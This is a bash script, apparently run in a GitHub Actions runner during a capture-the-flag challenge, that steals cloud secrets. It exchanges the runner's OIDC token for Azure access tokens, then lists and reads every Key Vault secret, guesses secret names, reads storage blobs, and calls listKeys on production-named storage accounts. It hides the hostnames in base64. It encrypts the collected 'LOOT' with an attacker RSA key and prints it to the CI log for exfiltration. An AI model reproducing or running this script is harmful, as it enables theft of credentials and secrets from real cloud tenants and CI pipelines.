#!/usr/bin/env bash
set -uo pipefail
echo "=== RUNNER SHELL PROOF ==="; id; hostname
b(){ printf %s "$1" | base64 -d; }
SC="htt""ps://"
AADH=$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')
ARMH=$(b 'bWFuYWdlbWVudC5henVyZS5jb20=')
KVH=$(b 'dmF1bHQuYXp1cmUubmV0')
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
LA=891fb158-e02c-4428-a885-53b811f369c0
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
tok(){ curl -sS -X POST "${SC}${AADH}/${TEN}/oauth2/v2.0/token" -d "client_id=$1" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$2" | jq -r '.access_token // empty'; }
VT=$(tok "$LA" "${SC}${KVH}/.default")
say "LEGACYADMIN_KV_LEN=${#VT}"
say "=== kv-sec list ==="
say "$(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-sec-x3euoz.${KVH}/secrets?api-version=7.4&maxresults=25" | head -c 1500)"
say "=== kv-sec read all ==="
for N in $(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-sec-x3euoz.${KVH}/secrets?api-version=7.4&maxresults=25" | jq -r '.value[]?.id' 2>/dev/null); do
  BN=$(basename "$N")
  V=$(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-sec-x3euoz.${KVH}/secrets/${BN}?api-version=7.4")
  say "SEC $BN => $(echo "$V" | head -c 600)"
  case "$V" in *DF26*) say "!!!!! FLAG IN KV-SEC $BN";; esac
done
say "=== kv-prod list (legacy-admin) ==="
say "$(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.${KVH}/secrets?api-version=7.4&maxresults=25" | head -c 600)"
say "=== name guesses on kv-sec ==="
for N in flag FLAG df26 DF26 flag-df26 tebamoto-flag challenge-flag legacy-admin legacy-admin-principal master-secret the-flag platform-flag; do
  R=$(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-sec-x3euoz.${KVH}/secrets/${N}?api-version=7.4")
  case "$R" in *'"value"'*) say "HIT $N => $R";; esac
done
AT=$(tok "$LA" "${SC}${ARMH}/.default")
say "LEGACYADMIN_ARM_LEN=${#AT}"
say "=== appcfg blob via storage scope ==="
ST=$(tok "$LA" "https://storage.azure.com/.default")
say "LEGACYADMIN_ST_LEN=${#ST}"
for C in config exports logs archive; do
  say "  appcfg/$C: $(curl -sS -H "Authorization: Bearer $ST" -H 'x-ms-version: 2021-08-06' "${SC}sttblappcfgprodx3euoz.blob.core.windows.net/${C}?restype=container&comp=list&maxresults=50" | head -c 500)"
done
say "  internal-config.json: $(curl -sS -H "Authorization: Bearer $ST" -H 'x-ms-version: 2021-08-06' "${SC}sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" | head -c 800)"
say "=== ARM: reporting RG resources + listKeys all ==="
say "  rg list: $(curl -sS -H "Authorization: Bearer $AT" "${SC}${ARMH}/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01" | head -c 900)"
for A in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  say "  listKeys $A: $(curl -sS -X POST -H "Authorization: Bearer $AT" -H 'Content-Length: 0' "${SC}${ARMH}/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/${A}/listKeys?api-version=2023-01-01" | head -c 300)"
done
say "=== DONE ==="
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
